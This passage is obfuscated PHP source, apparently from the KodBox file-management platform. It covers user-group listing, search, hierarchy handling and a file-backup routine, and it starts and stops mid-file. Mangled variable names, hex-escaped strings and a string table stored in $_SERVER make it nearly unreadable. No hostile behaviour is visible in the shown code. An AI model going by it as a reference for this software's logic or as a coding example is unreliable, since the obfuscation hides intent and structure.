ÑËç[1983], $¶ú¿¤); $ÀÉ„³î´ = Input::get($†¬ ÑËç[542], $†¬ ÑËç[7], $†¬ ÑËç[2074], array($†¬ ÑËç[2074], $†¬ ÑËç[536])); $ÀÉ„³î´ = $ĞßÑ­ô[$ÀÉ„³î´]; $­¨Ûİ®ù = $­¨Ûİ®ù . "{$Üşá‰¸}\x20{$ÀÉ„³î´}\x2c\40\x67\x72\157\x75\160\x49\x44\x20\141\163\143"; return $this->order($­¨Ûİ®ù); } public function listChild($„ÈñÆ”¥) { $¾ÌÎñÚ« =& $_SERVER[¼èá¯æÙ]; $Úß¶ûÃ = $this->where(array($¾ÌÎñÚ«[202] => $„ÈñÆ”¥))->_makeOrder()->selectPage(200); $this->_listDataApply($Úß¶ûÃ[$¾ÌÎñÚ«[457]]); return $Úß¶ûÃ; } public function listChildIds($ğ£åÇâ€) { $»…¦ˆ˜ =& $_SERVER[¼èá¯æÙ]; if (is_string($¬É—èÈÉ)) { $ğ£åÇâ€ = explode($»…¦ˆ˜[50], $ğ£åÇâ€); } $¿í™³’ = $this->where(array($»…¦ˆ˜[1979] => array($»…¦ˆ˜[7], $ğ£åÇâ€)))->field($»…¦ˆ˜[2075])->select(); if (!$¿í™³’) { return !1; } $Õá­‹œ = array(); foreach ($¿í™³’ as $İ²ªœÑ) { $Õá­‹œ[] = "\x73\x65\154\x65\143\164\40\x67\162\157\x75\160\111\x44\40\146\162\x6f\x6d\40\140\x67\162\x6f\165\x70\x60\40\x77\150\x65\x72\x65\x20\x70\x61\x72\x65\x6e\164\x4c\x65\166\x65\x6c\x20\x6c\151\153\145\x20\47{$İ²ªœÑ[$»…¦ˆ˜[595]]}{$İ²ªœÑ[$»…¦ˆ˜[1979]]}\x2c\x25\x27"; } $Õá­‹œ = implode($»…¦ˆ˜[2076], $Õá­‹œ); $¿í™³’ = $this->query($Õá­‹œ); if (!$¿í™³’) { return array(); } $ğ£åÇâ€ = array_to_keyvalue($¿í™³’, $»…¦ˆ˜[12], $»…¦ˆ˜[1979]); return array_unique($ğ£åÇâ€); } public function listByID($©ùşü¤Ç) { $ë–»æâ¡ =& $_SERVER[¼èá¯æÙ]; if (!$©ùşü¤Ç) { return array(); } $¾Ûè‡” = array($ë–»æâ¡[1979] => array($ë–»æâ¡[7], $©ùşü¤Ç)); $ô¦øÓî„ = $this->where($¾Ûè‡”)->select(); $ô¦øÓî„ = array_sort_keep($ô¦øÓî„, $ë–»æâ¡[1979], $©ùşü¤Ç); $this->_listDataApply($ô¦øÓî„); return $ô¦øÓî„; } public function listSearch($ş”¯²º) { $—‰öÎ”µ =& $_SERVER[¼èá¯æÙ]; $ùä´§±¹ = trim($ş”¯²º[$—‰öÎ”µ[2077]]); $Ã´ãÛÓ£ = explode($—‰öÎ”µ[53], $ùä´§±¹); if (!$ùä´§±¹ || count($Ã´ãÛÓ£) == 1) { return $this->listSearchNow($ş”¯²º); } $¦Íùô = array($—‰öÎ”µ[457] => array()); foreach ($Ã´ãÛÓ£ as $¿ùŸ‰†¬) { if (!trim($¿ùŸ‰†¬)) { continue; } $ş”¯²º[$—‰öÎ”µ[2077]] = $¿ùŸ‰†¬; $ĞÛĞ…—• = $this->listSearchNow($ş”¯²º); $¦Íùô[$—‰öÎ”µ[457]] = array_merge($¦Íùô[$—‰öÎ”µ[457]], $ĞÛĞ…—•[$—‰öÎ”µ[457]]); } $¦Íùô[$—‰öÎ”µ[457]] = array_unique_by_key($¦Íùô[$—‰öÎ”µ[457]], $—‰öÎ”µ[1979]); $¦Íùô[$—‰öÎ”µ[454]] = array($—‰öÎ”µ[455] => count($¦Íùô[$—‰öÎ”µ[457]]), $—‰öÎ”µ[451] => 20, $—‰öÎ”µ[440] => 1, $—‰öÎ”µ[456] => 1); return $¦Íùô; } public function listSearchNow($êÄ²¾ƒ) { $âÜ‡Éâã =& $_SERVER[¼èá¯æÙ]; $õŒ´Ÿ¢Ò = trim($êÄ²¾ƒ[$âÜ‡Éâã[2077]]); $‰»¥Š½å = isset($êÄ²¾ƒ[$âÜ‡Éâã[2078]]) ? $êÄ²¾ƒ[$âÜ‡Éâã[2078]] : !1; if (!trim($õŒ´Ÿ¢Ò)) { return !1; } $õŒ´Ÿ¢Ò = str_replace($âÜ‡Éâã[2079], $âÜ‡Éâã[2080], $õŒ´Ÿ¢Ò); $ÉÒ†‰€ = array($âÜ‡Éâã[1979] => array($âÜ‡Éâã[470], "{$õŒ´Ÿ¢Ò}\x25"), $âÜ‡Éâã[32] => array($âÜ‡Éâã[470], "\45{$õŒ´Ÿ¢Ò}\x25"), $âÜ‡Éâã[1082] => $âÜ‡Éâã[2081]); if ($‰»¥Š½å) { $ëî‹àÀ£ = $this->getInfoSimple($‰»¥Š½å); $ª…Çşá± = $ëî‹àÀ£[$âÜ‡Éâã[595]] . $‰»¥Š½å . $âÜ‡Éâã[627]; $ÉÒ†‰€ = array($ÉÒ†‰€, array($âÜ‡Éâã[595] => array($âÜ‡Éâã[470], $ª…Çşá±))); } $ÉÒ†‰€ = $this->parseWhereLike($ÉÒ†‰€); $² üó— = $this->_makeOrder()->where($ÉÒ†‰€)->selectPage(20); $² üó— = $² üó— ? $² üó— : array($âÜ‡Éâã[457] => array(), $âÜ‡Éâã[454] => array()); if (!$² üó— || count($² üó—[$âÜ‡Éâã[457]]) < 5 && Input::check($õŒ´Ÿ¢Ò, $âÜ‡Éâã[405])) { $ıò›éáã = $this->groupChildrenAll($‰»¥Š½å); $÷‚š÷äÛ = $this->_searchFromMeta($âÜ‡Éâã[548], $õŒ´Ÿ¢Ò, 10, $ıò›éáã); $şºÈ¤ØÃ = $this->_searchFromMeta($âÜ‡Éâã[549], $õŒ´Ÿ¢Ò, 10, $ıò›éáã); $“‡ßË±Æ = array_merge($÷‚š÷äÛ, $şºÈ¤ØÃ, $² üó—[$âÜ‡Éâã[457]]); $² üó—[$âÜ‡Éâã[457]] = array_unique_by_key($“‡ßË±Æ, $âÜ‡Éâã[1979]); $² üó—[$âÜ‡Éâã[454]][$âÜ‡Éâã[455]] = count($² üó—[$âÜ‡Éâã[457]]); $² üó—[$âÜ‡Éâã[454]][$âÜ‡Éâã[456]] = ceil($² üó—[$âÜ‡Éâã[454]][$âÜ‡Éâã[455]] / $² üó—[$âÜ‡Éâã[454]][$âÜ‡Éâã[451]]); } $this->_listDataApply($² üó—[$âÜ‡Éâã[457]]); return $² üó—; } protected function groupChildrenAll($¨ã·•) { $Ÿ ëÄ°˜ =& $_SERVER[¼èá¯æÙ]; if (!$¨ã·•) { return !1; } if (!is_array($¨ã·•)) { $¨ã·• = array($¨ã·•); } $Õï­Úìğ = $¨ã·•; foreach ($¨ã·• as $ç¡…±ó®) { $Ô´æÄçÉ = $this->getInfoSimple($ç¡…±ó®); $üæ¹äù§ = array($Ÿ ëÄ°˜[595] => array($Ÿ ëÄ°˜[470], $Ô´æÄçÉ[$Ÿ ëÄ°˜[595]] . $ç¡…±ó® . $Ÿ ëÄ°˜[627])); $¼É»áØƒ = $this->field($Ÿ ëÄ°˜[1979])->where($üæ¹äù§)->select(); $Õï­Úìğ = array_merge($Õï­Úìğ, array_to_keyvalue($¼É»áØƒ, $Ÿ ëÄ°˜[12], $Ÿ ëÄ°˜[1979])); } return array_unique($Õï­Úìğ); } private function _searchFromMeta($€¿Ôß , $Öé·©, $õÉÓáÊÚ, $ˆÔğÑçâ) { $¬³Ôü„ò =& $_SERVER[¼èá¯æÙ]; $Öé·© = strtolower($Öé·©); $ñß»™„¦ = array($¬³Ôü„ò[107] => $€¿Ôß , $¬³Ôü„ò[462] => array($¬³Ôü„ò[470], "\45{$Öé·©}\45")); $ñß»™„¦ = $this->parseWhereLike($ñß»™„¦); if ($ˆÔğÑçâ) { $ñß»™„¦[$¬³Ôü„ò[1979]] = array($¬³Ôü„ò[7], $ˆÔğÑçâ); } $çÖê©ŠÛ = Model($¬³Ôü„ò[2082])->where($ñß»™„¦)->limit($õÉÓáÊÚ)->select(); if (!$çÖê©ŠÛ) { return array(); } $çÖê©ŠÛ = array_to_keyvalue($çÖê©ŠÛ, $¬³Ôü„ò[12], $¬³Ôü„ò[1979]); $¤£Œì– = $this->where(array($¬³Ôü„ò[2071] => array($¬³Ôü„ò[7], $çÖê©ŠÛ)))->select(); if (!$¤£Œì–) { return array(); } return $¤£Œì–; } protected function _listDataApplyItem($¿î÷Ë§í) { $±ññ…ß = array($¿î÷Ë§í); $this->_listDataApply($±ññ…ß); return $±ññ…ß[0]; } protected function _listDataApply(&$ª¸úÜÜ¡) { $®•¢¿‚ı =& $_SERVER[¼èá¯æÙ]; if (!$ª¸úÜÜ¡) { return; } $åÕ×”şÄ = array_to_keyvalue($ª¸úÜÜ¡, $®•¢¿‚ı[12], $®•¢¿‚ı[1979]); $this->_listAppendChildren($ª¸úÜÜ¡); $this->_listAppendChildrenMember($ª¸úÜÜ¡); $this->_listAppendMeta($ª¸úÜÜ¡, $åÕ×”şÄ); $this->_listAppendParent($ª¸úÜÜ¡); $this->_listAppendSourceRoot($ª¸úÜÜ¡, $åÕ×”şÄ); } private function _listAppendChildren(&$§ÔÃ’“ç) { $ÍÀ£ÀÍÅ =& $_SERVER[¼èá¯æÙ]; $÷›Èà‹Ğ = array_to_keyvalue($§ÔÃ’“ç, $ÍÀ£ÀÍÅ[12], $ÍÀ£ÀÍÅ[1979]); $÷“¥ù ï = array($ÍÀ£ÀÍÅ[202] => array($ÍÀ£ÀÍÅ[7], $÷›Èà‹Ğ)); $˜£½¿‚ü = array($ÍÀ£ÀÍÅ[202], $ÍÀ£ÀÍÅ[2083] => $ÍÀ£ÀÍÅ[576]); $Ïä‘²¢à = $this->field($˜£½¿‚ü)->where($÷“¥ù ï)->group($ÍÀ£ÀÍÅ[202])->select(); $‡ã¶û’¼ = array_to_keyvalue($Ïä‘²¢à, $ÍÀ£ÀÍÅ[202], $ÍÀ£ÀÍÅ[576]); foreach ($§ÔÃ’“ç as &$ôÎç€Ò) { $éî­Äé = $ôÎç€Ò[$ÍÀ£ÀÍÅ[1979]]; $ôÎç€Ò[$ÍÀ£ÀÍÅ[2084]] = isset($‡ã¶û’¼[$éî­Äé]) ? intval($‡ã¶û’¼[$éî­Äé]) : !1; } unset($ôÎç€Ò); } private function _listAppendChildrenMember(&$¿ÓÉ¤÷Ò) { $†‹§Ö‘Ë =& $_SERVER[¼èá¯æÙ]; $«ÚŞÑİŒ = array_to_keyvalue($¿ÓÉ¤÷Ò, $†‹§Ö‘Ë[12], $†‹§Ö‘Ë[1979]); $Àıéã¢Á = array($†‹§Ö‘Ë[1979] => array($†‹§Ö‘Ë[7], $«ÚŞÑİŒ)); $‚ìÖ¼àµ = array($†‹§Ö‘Ë[1979], $†‹§Ö‘Ë[2083] => $†‹§Ö‘Ë[576]); $½ˆÎ©ÚË = Model($†‹§Ö‘Ë[2073])->field($‚ìÖ¼àµ)->where($Àıéã¢Á)->group($†‹§Ö‘Ë[1979])->select(); $‡“¢¥¸Ó = array_to_keyvalue($½ˆÎ©ÚË, $†‹§Ö‘Ë[1979], $†‹§Ö‘Ë[576]); foreach ($¿ÓÉ¤÷Ò as &$åÁîÄğ) { $…ÒŞŸÁ = $åÁîÄğ[$†‹§Ö‘Ë[1979]]; $åÁîÄğ[$†‹§Ö‘Ë[2085]] = isset($‡“¢¥¸Ó[$…ÒŞŸÁ]) ? intval($‡“¢¥¸Ó[$…ÒŞŸÁ]) : !1; } unset($åÁîÄğ); } private function _listAppendMeta(&$®çûŒİü, $¬Åã÷«) { $€ÕŸÏëÍ =& $_SERVER[¼èá¯æÙ]; $ıÅê»«÷ = array($€ÕŸÏëÍ[1979] => array($€ÕŸÏëÍ[7], $¬Åã÷«)); $”­çÂı = Model($€ÕŸÏëÍ[2072])->where($ıÅê»«÷)->select(); $”­çÂı = array_to_keyvalue_group($”­çÂı, $€ÕŸÏëÍ[1979]); foreach ($”­çÂı as &$…ğà“æî) { $…ğà“æî = array_to_keyvalue($…ğà“æî, $€ÕŸÏëÍ[107], $€ÕŸÏëÍ[462]); } unset($…ğà“æî); foreach ($®çûŒİü as &$û«€şİØ) { $û«€şİØ[$€ÕŸÏëÍ[550]] = array(); if (isset($”­çÂı[$û«€şİØ[$€ÕŸÏëÍ[1979]]])) { $û«€şİØ[$€ÕŸÏëÍ[550]] = $”­çÂı[$û«€şİØ[$€ÕŸÏëÍ[1979]]]; } } unset($û«€şİØ); } protected function parentLevelArray($è¢Ç“Ê) { $‘ğû¼™ =& $_SERVER[¼èá¯æÙ]; $è¢Ç“Ê = explode($‘ğû¼™[50], trim($è¢Ç“Ê, $‘ğû¼™[50])); $è¢Ç“Ê = array_remove_value($è¢Ç“Ê, $‘ğû¼™[240]); return $è¢Ç“Ê; } protected function parentInGroup($–Ó®é¢Ş, $Ä‹É£­Ë) { $ó®­´çË =& $_SERVER[¼èá¯æÙ]; $Ğš Ã¥Å = $this->getInfoSimple($–Ó®é¢Ş); if (!$Ğš Ã¥Å) { return !0; } $£ŒÙü£¡ = $this->parentLevelArray($Ğš Ã¥Å[$ó®­´çË[595]]); $£ŒÙü£¡[] = $–Ó®é¢Ş; foreach ($£ŒÙü£¡ as $–Ó®é¢Ş) { if (in_array($–Ó®é¢Ş . $ó®­´çË[12], $Ä‹É£­Ë)) { return !0; } } return !1; } private function _listAppendParent(&$¸šâıä¸) { $ÎÅÌÔÒ =& $_SERVER[¼èá¯æÙ]; $È·ˆı³À = array(); foreach ($¸šâıä¸ as &$ûÂÓÊà¢) { $È·ˆı³À[$ûÂÓÊà¢[$ÎÅÌÔÒ[1979]]] = $ûÂÓÊà¢[$ÎÅÌÔÒ[32]]; $ªòæöõ = $this->parentLevelArray($ûÂÓÊà¢[$ÎÅÌÔÒ[595]]); foreach ($ªòæöõ as $ÖãÜ–¯) { if (!isset($È·ˆı³À[$ÖãÜ–¯])) { $È·ˆı³À[$ÖãÜ–¯] = 0; } } } unset($ûÂÓÊà¢); foreach ($È·ˆı³À as $à¡¥£ƒ => $§‹ïÅùØ) { if ($§‹ïÅùØ) { continue; } $ÖÛÊÊĞ¹ = $this->getInfoSimple($à¡¥£ƒ); $È·ˆı³À[$à¡¥£ƒ] = $ÖÛÊÊĞ¹[$ÎÅÌÔÒ[32]]; } $†Ğãé£ò = $GLOBALS[$ÎÅÌÔÒ[6]][$ÎÅÌÔÒ[102]][$ÎÅÌÔÒ[2086]]; if (KodUser::isRoot()) { $†Ğãé£ò = !1; } foreach ($¸šâıä¸ as &$ûÂÓÊà¢) { $ªòæöõ = $this->parentLevelArray($ûÂÓÊà¢[$ÎÅÌÔÒ[595]]); $­ŞÔß‘Ô = $ÎÅÌÔÒ[12]; foreach ($ªòæöõ as $à¡¥£ƒ => $ÖãÜ–¯) { if ($†Ğãé£ò && $à¡¥£ƒ == 0) { continue; } $­ŞÔß‘Ô .= $È·ˆı³À[$ÖãÜ–¯] . $ÎÅÌÔÒ[8]; } if ($ªòæöõ) { $­ŞÔß‘Ô .= $ûÂÓÊà¢[$ÎÅÌÔÒ[32]]; } $ûÂÓÊà¢[$ÎÅÌÔÒ[600]] = str_replace($ÎÅÌÔÒ[266], $ÎÅÌÔÒ[8], $­ŞÔß‘Ô); } unset($ûÂÓÊà¢); } private function _listAppendSourceRoot(&$Å®¢õ‰æ, $ƒ¡ôÈª) { $åÅÓ¡ã =& $_SERVER[¼èá¯æÙ]; $èÎá¬œ‡ = Model($åÅÓ¡ã[907])->listSourceRoot(SourceModel::TYPE_GROUP, $ƒ¡ôÈª); $èÎá¬œ‡ = array_to_keyvalue($èÎá¬œ‡, $åÅÓ¡ã[580]); $èÎá¬œ‡ = array_remove_key($èÎá¬œ‡, $åÅÓ¡ã[580]); foreach ($Å®¢õ‰æ as &$ÚáÄ”Â±) { $ÚáÄ”Â±[$åÅÓ¡ã[100]] = $èÎá¬œ‡[$ÚáÄ”Â±[$åÅÓ¡ã[1979]]] ? $èÎá¬œ‡[$ÚáÄ”Â±[$åÅÓ¡ã[1979]]] : array(); } unset($ÚáÄ”Â±); } protected function groupMerge($øñÔî™Â) { $øñÔî™Â = array_values(array_unique($øñÔî™Â)); $æÄŞÚåÛ = array(); for ($ì·Âº¢Ü = 0; $ì·Âº¢Ü < count($øñÔî™Â); $ì·Âº¢Ü++) { $Ã¹ÀÏÂ = !1; for ($“èÕÂ¨ƒ = 0; $“èÕÂ¨ƒ < count($øñÔî™Â); $“èÕÂ¨ƒ++) { if ($ì·Âº¢Ü == $“èÕÂ¨ƒ) { continue; } if ($this->isParentOf($øñÔî™Â[$“èÕÂ¨ƒ], $øñÔî™Â[$ì·Âº¢Ü])) { $Ã¹ÀÏÂ = !0; break; } } if (!$Ã¹ÀÏÂ) { $æÄŞÚåÛ[] = $øñÔî™Â[$ì·Âº¢Ü]; } } return $æÄŞÚåÛ; } protected function isParentOf($ùˆú”§, $ÁáÒÔç) { $ÕÅßÛ =& $_SERVER[¼èá¯æÙ]; if (!$ùˆú”§ || !$ÁáÒÔç || $ùˆú”§ == $ÁáÒÔç) { return !1; } $á‚Ùõé§ = $this->getInfoSimple($ùˆú”§); $ˆáúÉõ = $this->getInfoSimple($ÁáÒÔç); $»Á¹•ü = $á‚Ùõé§[$ÕÅßÛ[595]] . $ùˆú”§ . $ÕÅßÛ[50]; if (substr($ˆáúÉõ[$ÕÅßÛ[595]], 0, strlen($»Á¹•ü)) == $»Á¹•ü) { return !0; } return !1; } public function groupShowRoot($Ñ©¶ì©ê, $øƒõ“± = false) { $şô™šç™ =& $_SERVER[¼èá¯æÙ]; $í«œ¿ = $this->getInfo($Ñ©¶ì©ê); if (!$í«œ¿) { return array(); } $ñ…åŸÎ¯ = $this->parentLevelArray($í«œ¿[$şô™šç™[595]]); $ëÑÁş¾— = array($Ñ©¶ì©ê); if (count($ñ…åŸÎ¯) == 0) { return $ëÑÁş¾—; } if ($øƒõ“± && count($ñ…åŸÎ¯) == 1) { return $ëÑÁş¾—; } if (!$í«œ¿[$şô™šç™[550]] || !isset($í«œ¿[$şô™šç™[550]][$şô™šç™[2069]]) || $í«œ¿[$şô™šç™[550]][$şô™šç™[2069]] == $şô™šç™[858]) { return $this->groupShowRoot($ñ…åŸÎ¯[count($ñ…åŸÎ¯) - 1], $øƒõ“±); } if ($í«œ¿[$şô™šç™[550]][$şô™šç™[2069]] == $şô™šç™[444]) { $•¦èéÔÆ = explode($şô™šç™[50], $í«œ¿[$şô™šç™[550]][$şô™šç™[2070]]); if ($•¦èéÔÆ) { $ëÑÁş¾— = array_merge($ëÑÁş¾—, $•¦èéÔÆ); } } return $ëÑÁş¾—; } protected function resetParentLevel() { $Ä†Í£š =& $_SERVER[¼èá¯æÙ]; $†¢Éê¤ƒ = $Ä†Í£š[1979]; $Õª¹ô—Ì = $this->select(); $Õª¹ô—Ì = array_to_keyvalue($Õª¹ô—Ì, $†¢Éê¤ƒ); foreach ($Õª¹ô—Ì as $¥¼†å¤) { $…²ºüÍ¢ = $¥¼†å¤; $ ˆÑè = array(); while ($…²ºüÍ¢[$Ä†Í£š[202]] != 0) { $ ˆÑè[] = $…²ºüÍ¢[$Ä†Í£š[202]]; $…²ºüÍ¢ = $Õª¹ô—Ì[$…²ºüÍ¢[$Ä†Í£š[202]]]; } $ ˆÑè[] = 0; $ ˆÑè = $Ä†Í£š[50] . implode($Ä†Í£š[50], array_reverse($ ˆÑè)) . $Ä†Í£š[50]; $this->setNamePinyin($¥¼†å¤[$†¢Éê¤ƒ], $¥¼†å¤[$Ä†Í£š[32]]); $this->where(array($†¢Éê¤ƒ => $¥¼†å¤[$†¢Éê¤ƒ]))->save(array($Ä†Í£š[666] => $ ˆÑè)); } return $Õª¹ô—Ì; } public function groupNameAuto($¾‘ÛÛº™, $°œĞÅÂ—) { $¦šÙè‡â =& $_SERVER[¼èá¯æÙ]; $ÓçÒ§² = $this->where(array($¦šÙè‡â[488] => $¾‘ÛÛº™))->getField($¦šÙè‡â[32], !0); if (!$ÓçÒ§² || !in_array($°œĞÅÂ—, $ÓçÒ§²)) { return $°œĞÅÂ—; } for ($ûêË¤ûÔ = 1; $ûêË¤ûÔ <= count($ÓçÒ§²) + 1; $ûêË¤ûÔ++) { $Ã³½ó‰š = $°œĞÅÂ— . "\x28{$ûêË¤ûÔ}\51"; if (!in_array($Ã³½ó‰š, $ÓçÒ§²)) { return $Ã³½ó‰š; } } } public function groupSwitch($ê‹õº‘’, $Ö‹”©ÕÃ) { $È¶“û±‹ =& $_SERVER[¼èá¯æÙ]; $Ë“ñ¨™¾ = array($È¶“û±‹[1979] => array($È¶“û±‹[7], array($ê‹õº‘’, $Ö‹”©ÕÃ))); $“¯ıƒÙ = $this->where($Ë“ñ¨™¾)->select(); $“¯ıƒÙ = array_to_keyvalue($“¯ıƒÙ, $È¶“û±‹[1979]); if (!isset($“¯ıƒÙ[$ê‹õº‘’]) || !isset($“¯ıƒÙ[$Ö‹”©ÕÃ]) || $“¯ıƒÙ[$ê‹õº‘’][$È¶“û±‹[202]] == 0) { return !1; } $Ë“ñ¨™¾ = array($È¶“û±‹[1979] => $ê‹õº‘’); $‹º˜ù“Ÿ = Model($È¶“û±‹[2073])->where($Ë“ñ¨™¾)->select(); if (!$‹º˜ù“Ÿ) { $‹º˜ù“Ÿ = array(); } foreach ($‹º˜ù“Ÿ as $ùÛïÑ½Ğ) { $âÓÚÂ‘ = $ùÛïÑ½Ğ[$È¶“û±‹[1778]]; $Ë“ñ¨™¾ = array($È¶“û±‹[1778] => $âÓÚÂ‘, $È¶“û±‹[1979] => $Ö‹”©ÕÃ); $æŒİ¤ª£ = Model($È¶“û±‹[2073])->where($Ë“ñ¨™¾)->find(); if (!$æŒİ¤ª£) { $Û…Ü‚èİ = array($Ö‹”©ÕÃ => $ùÛïÑ½Ğ[$È¶“û±‹[2087]]); Model($È¶“û±‹[608])->userGroupAdd($âÓÚÂ‘, $Û…Ü‚èİ); } Model($È¶“û±‹[608])->userGroupRemove($âÓÚÂ‘, $ê‹õº‘’); } $Ë“ñ¨™¾ = array($È¶“û±‹[200] => 2, $È¶“û±‹[202] => 0, $È¶“û±‹[496] => 1, $È¶“û±‹[580] => array($È¶“û±‹[7], array($ê‹õº‘’, $Ö‹”©ÕÃ))); $Áõ—Ë‚ = Model($È¶“û±‹[907])->where($Ë“ñ¨™¾)->field($È¶“û±‹[2088])->select(); $Áõ—Ë‚ = array_to_keyvalue($Áõ—Ë‚, $È¶“û±‹[580], $È¶“û±‹[203]); $Úì¡Âî™ = !empty($Áõ—Ë‚[$ê‹õº‘’]) ? $Áõ—Ë‚[$ê‹õº‘’] : !1; if ($Úì¡Âî™) { if (!$Áõ—Ë‚[$Ö‹”©ÕÃ]) { $Áõ—Ë‚[$Ö‹”©ÕÃ] = Model($È¶“û±‹[907])->groupRootAdd($Ö‹”©ÕÃ); } $‘Ú´Ú’¹ = $Áõ—Ë‚[$Ö‹”©ÕÃ]; $Ë“ñ¨™¾ = array($È¶“û±‹[202] => $Úì¡Âî™); $Áõ—Ë‚ = Model($È¶“û±‹[907])->where($Ë“ñ¨™¾)->field($È¶“û±‹[2089])->select(); if (!$Áõ—Ë‚) { $Áõ—Ë‚ = array(); } Model($È¶“û±‹[907])->moveClearAuth = !1; foreach ($Áõ—Ë‚ as $°âĞç©) { $òñ¢ÔÇ¬ = $°âĞç©[$È¶“û±‹[496]] == $È¶“û±‹[101] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($È¶“û±‹[907])->move($°âĞç©[$È¶“û±‹[203]], $‘Ú´Ú’¹, $òñ¢ÔÇ¬); } Model($È¶“û±‹[907])->moveClearAuth = !0; $Ë“ñ¨™¾ = array($È¶“û±‹[200] => 2, $È¶“û±‹[580] => $ê‹õº‘’); $æİ’ê±ç = array($È¶“û±‹[580] => $Ö‹”©ÕÃ); Model($È¶“û±‹[2090])->where($Ë“ñ¨™¾)->save($æİ’ê±ç); Model($È¶“û±‹[2091])->where($Ë“ñ¨™¾)->save($æİ’ê±ç); } $this->_changeChildLevel($“¯ıƒÙ[$ê‹õº‘’], $“¯ıƒÙ[$Ö‹”©ÕÃ], !0); $this->where(array($È¶“û±‹[202] => $ê‹õº‘’))->save(array($È¶“û±‹[202] => $Ö‹”©ÕÃ)); $this->_clearChildrenCache($“¯ıƒÙ[$Ö‹”©ÕÃ]); return !0; } } goto fåù›Ü©¹; cæé¥ŞâŒÅ: class BackupFile { public function __construct() { } public function index() { $äĞ‡¬”‹ = Backup::get(); $‡ª‚Íú¶ = $äĞ‡¬”‹[$_SERVER[¼èá¯æÙ][380]][$_SERVER[¼èá¯æÙ][242]][$_SERVER[¼èá¯æÙ][552]]; $ö¹Äèâ = array($_SERVER[¼èá¯æÙ][553] => array($_SERVER[¼èá¯æÙ][890], $‡ª‚Íú¶), $_SERVER[¼èá¯æÙ][891] => array($_SERVER[¼èá¯æÙ][418], $äĞ‡¬”‹[$_SERVER[¼èá¯æÙ][834]])); $ü¶¿ëì‹ = (int) Model($_SERVER[¼èá¯æÙ][872])->where($ö¹Äèâ)->count($_SERVER[¼èá¯æÙ][552]); $¥”ş·í = (int) Model($_SERVER[¼èá¯æÙ][872])->where($ö¹Äèâ)->sum($_SERVER[¼èá¯æÙ][89]); $²İª×ÇÅ = new TaskFileTransfer($_SERVER[¼èá¯æÙ][892], $_SERVER[¼èá¯æÙ][866], $ü¶¿ëì‹, LNG($_SERVER[¼èá¯æÙ][867]) . $_SERVER[¼èá¯æÙ][868] . LNG($_SERVER[¼èá¯æÙ][893])); $²İª×ÇÅ->task[$_SERVER[¼èá¯æÙ][845]] = $¥”ş·í; $Û”¾ºÄÓ = array($_SERVER[¼èá¯æÙ][894] => $ü¶¿ëì‹, $_SERVER[¼èá¯æÙ][895] => $¥”ş·í, $_SERVER[¼èá¯æÙ][896] => time()); Backup::set($Û”¾ºÄÓ); $Üğ„›úÕ = !0; $†ùìşú = $this->storeIds(); $ª÷¥ëá¿ = 1; $û­¶½öˆ = 1000; $– ş÷İÎ = $Ğ™²‹ù = 0; $–Ø™©÷Ï = array(); $ç—Æ—Ãœ = $™Û§§Õ = 0; do { $½ÀËÕÒ¢ = $_SERVER[¼èá¯æÙ][897]; $ô†ºÑ†³ = Model($_SERVER[¼èá¯æÙ][872])->where($ö¹Äèâ)->field($½ÀËÕÒ¢)->order($_SERVER[¼èá¯æÙ][898])->selectPage($û­¶½öˆ, $ª÷¥ëá¿); $¹Çµßğ = !empty($ô†ºÑ†³[$_SERVER[¼èá¯æÙ][457]]) ? $ô†ºÑ†³[$_SERVER[¼èá¯æÙ][457]] : array(); foreach ($¹Çµßğ as $•š¤…°É) { if (!$this->_fileExist($•š¤…°É, $–Ø™©÷Ï, $†ùìşú)) { write_log("\x66\x69\x6c\x65\x20\156\157\164\x20\145\x78\x69\163\164\x2e\x66\151\154\x65\111\x44\x3a{$•š¤…°É[$_SERVER[¼èá¯æÙ][552]]}\54\x20\x70\141\164\150\x3a{$•š¤…°É[$_SERVER[¼èá¯æÙ][97]]}", $_SERVER[¼èá¯æÙ][899]); continue; } $Ï³“İ°ª = $•š¤…°É[$_SERVER[¼èá¯æÙ][97]]; $˜áüÎ£Á = "\173\x69\157\x3a{$äĞ‡¬”‹[$_SERVER[¼èá¯æÙ][834]]}\x7d" . substr($Ï³“İ°ª, strlen("\x7b\151\x6f\x3a{$•š¤…°É[$_SERVER[¼èá¯æÙ][900]]}\x7d")); if (IO::exist($˜áüÎ£Á)) { $²İª×ÇÅ->updateFileEnd($•š¤…°É[$_SERVER[¼èá¯æÙ][32]], $•š¤…°É[$_SERVER[¼èá¯æÙ][89]]); } else { $˜áüÎ£Á = get_path_father($˜áüÎ£Á); IO::mkdir($˜áüÎ£Á); if (!IO::copy($Ï³“İ°ª, $˜áüÎ£Á, $_SERVER[¼èá¯æÙ][901])) { write_log($_SERVER[¼èá¯æÙ][902] . $Ï³“İ°ª . $_SERVER[¼èá¯æÙ][886] . $˜áüÎ£Á . $_SERVER[¼èá¯æÙ][188], $_SERVER[¼èá¯æÙ][866]); $Üğ„›úÕ = !1; break; } } $‡ª‚Íú¶ = $•š¤…°É[$_SERVER[¼èá¯æÙ][552]]; $Ğ™²‹ù += 1; $– ş÷İÎ += $•š¤…°É[$_SERVER[¼èá¯æÙ][89]]; $™Û§§Õ += 1; $ç—Æ—Ãœ += $•š¤…°É[$_SERVER[¼èá¯æÙ][89]]; if ($– ş÷İÎ >= 1024 * 1024 * 100) { $Û”¾ºÄÓ = array($_SERVER[¼èá¯æÙ][833] => $‡ª‚Íú¶, $_SERVER[¼èá¯æÙ][903] => $™Û§§Õ, $_SERVER[¼èá¯æÙ][904] => $ç—Æ—Ãœ); Backup::set($Û”¾ºÄÓ); $– ş÷İÎ = $Ğ™²‹ù = 0; } } $ŒøˆöáÊ = count($¹Çµßğ); $ª÷¥ëá¿++; } while ($ŒøˆöáÊ == $û­¶½öˆ); $²İª×ÇÅ->end(); $Û”¾ºÄÓ = array($_SERVER[¼èá¯æÙ][905] => 1, $_SERVER[¼èá¯æÙ][843] => time(), $_SERVER[¼èá¯æÙ][857] => 1, $_SERVER[¼èá¯æÙ][833] => $‡ª‚Íú¶, $_SERVER[¼èá¯æÙ][906] => time()); if ($Ğ™²‹ù) { $Û”¾ºÄÓ[$_SERVER[¼èá¯æÙ][903]] = $™Û§§Õ; $Û”¾ºÄÓ[$_SERVER[¼èá¯æÙ][904]] = $ç—Æ—Ãœ; } Backup::set($Û”¾ºÄÓ); return !0; } private function _fileExist($á§Ÿ¢¤‘, &$Ã¢¾§‡Ø, $¿°ƒä¤“) { $“àøÎºş =& $_SERVER[¼èá¯æÙ]; $û•€Øßã = $á§Ÿ¢¤‘[$“àøÎºş[97]]; if 